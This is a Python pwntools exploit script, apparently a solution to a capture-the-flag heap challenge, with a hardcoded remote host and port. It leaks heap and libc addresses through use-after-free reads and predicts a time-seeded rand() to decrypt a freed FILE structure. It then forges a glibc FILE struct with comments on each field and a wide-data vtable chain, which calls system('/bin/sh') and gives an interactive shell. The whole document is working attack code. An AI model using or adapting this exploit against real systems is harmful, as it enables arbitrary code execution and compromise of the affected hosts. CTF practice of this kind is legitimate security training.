#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL
from time import time

libc_imp = CDLL('./libc.so.6')
libc_imp.srand(int(time()))

context.log_level = 'error'
context.binary = elf = ELF('./chall')
context.terminal = ['alacritty', '-e']

gs = """
continue
"""
if args.REMOTE:
    io = remote("193.148.168.30", 7669)
else:
    io = process()
    if args.GDB:
        gdb.attach(io, gdbscript=gs)

libc = elf.libc
context.log_level = 'info'

# PWN HERE

def create_chonc(size: int):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b':\n', str(size).encode())

def view_chonc(number: int):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b':\n', str(number).encode())

def edit_chonc(number: int, content: bytes):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b':\n', str(number).encode())
    io.sendlineafter(b':\n', content)

def delete_chonc(number: int):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b':\n', str(number).encode())

def create_chonc_file():
    io.sendlineafter(b'> ', b'5')

def delete_chonc_file():
    io.sendlineafter(b'> ', b'6')

def write_chonc_file():
    io.sendlineafter(b'> ', b'7')
    io.sendlineafter(b']\n', b'y')

# Get heap leak
create_chonc(0x28)
delete_chonc(1)

create_chonc(0x28)
view_chonc(1)

io.recvuntil(b': ')
heap_base = unpack(io.recv(8)) << 12
info("heap base : " + hex(heap_base))

create_chonc_file()
delete_chonc_file()

create_chonc(0x1d8) # get the freed file struct
view_chonc(2)

io.recvuntil(b': ')
file_data = io.recv(0x1d0) # sizeof(struct _IO_FILE)

# Now we want to decrypt the file with our random bypass

result = b''
for i in range(0, 0x1d0, 4):
    n = u32(file_data[i:i+4])
    libc_imp.rand()
    key = libc_imp.rand()
    n ^= key
    result += p32(n)

stderr = unpack(result[104:112]) # from _IO_FILE offsets to chain -> _IO_2_1_stderr_
libc.address = stderr - libc.sym._IO_2_1_stderr_ 

info("_IO_2_1_stderr_@GLIBC : " + hex(stderr))
info("libc base : " + hex(libc.address))

stream = heap_base + 0x2f0

fp = FileStructure()
fp.flags = unpack(b" /bin/sh")              # we need " " at the start so that flags & _IO_NO_WRITES = 0
fp._IO_read_ptr = 0                         # 0 by default, for clarity. This will ensure /bin/sh is null terminated
fp._lock = heap_base                        # we know that heap base starts with 0 so it's a valid lock
fp._IO_save_base = stream - 0x18            # so that _wide_data->vtable + 0x68 lands at fp->_IO_backup_base
fp._IO_backup_base = libc.sym.system        # allocbuf will land here calling system(fp)
fp._wide_data = stream - 0x98               # so that _wide_data->vtable lands at fp->_IO_save_base
fp.vtable = libc.sym.__io_vtables + 0x328   # this address + 0x38 will call _IO_wfile_overflow


# write our own file struct
edit_chonc(2, bytes(fp))
write_chonc_file() # trigger fwrite -> system("/bin/sh")

context.log_level = 'error'
io.interactive(prompt="shell> ")
io.close()
